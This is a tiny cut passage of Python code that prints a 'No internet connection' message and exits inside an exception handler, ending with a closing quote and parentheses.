	print('\n No internet connection ...')
	exit()
except:exit()
'))
